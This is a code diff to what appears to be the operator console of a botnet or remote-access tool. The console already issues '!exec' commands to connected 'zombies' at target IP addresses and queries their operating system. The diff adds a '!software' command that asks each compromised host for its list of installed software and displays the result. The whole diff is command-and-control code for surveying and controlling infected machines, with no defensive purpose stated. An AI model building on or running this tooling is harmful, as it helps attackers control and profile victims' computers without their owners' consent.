@@ -12,7 +12,10 @@ codes_list = {
     '1':'exec',
     '__comment__get_os':'cid=2, does not have second part (for request)',
     'get_os':'2',
-    '2':'get_os'
+    '2':'get_os',
+    '__comment__get_software':'cid=3, does not have second part (for request)',
+    'get_software':'3',
+    '3':'get_software'
 }
 
 class Terminal:
@@ -39,6 +42,7 @@ Example: !exec "ls" -h "192.168.1.100:49700"
 Select Target           ---> -h "TARGET"
 !set target TARGET      ---> set default target
 !get-zombies            ---> get connected zombies
+!software               ---> get target installed software
             '''
             self.push_text_in_terminal_box(text=help_msg)
 
@@ -49,6 +53,8 @@ Select Target           ---> -h "TARGET"
                 self.push_text_in_terminal_box(text=ac[0])
         elif self.command.startswith('!get-os'):
             self.get_os()
+        elif self.command.startswith('!software'):
+            self.get_software()
         else:
             first_command = self.command.split(' ')
             if len(first_command) >= 1 :
@@ -56,6 +62,24 @@ Select Target           ---> -h "TARGET"
             elif len(first_command) == 0:
                 first_command = self.command
             self.push_text_in_terminal_box(text='Command {} Not Found!'.format(first_command))
+
+    def get_software(self):
+        target_list = self.find_target_zombie()
+        if target_list:
+            for target in target_list:
+                communicator = self.get_communicator(target=target)
+                msg = 'cid={},'.format(codes_list['get_software'])
+                reply = communicator.msg_manager(msg=msg, has_reply=True)
+
+                get_cid_pattern = r'cid=(\d*),'
+                cid = re.findall(get_cid_pattern, reply)
+                if len(cid) == 1:
+                    cid = cid[0]
+                    if codes_list[cid] == 'get_software':
+                        output = reply.split(',')
+                        if len(output) >= 2:
+                            output = ",".join(output[1:])
+                            self.push_text_in_terminal_box(text=output)
 
     def get_os(self):
         target_list = self.find_target_zombie()
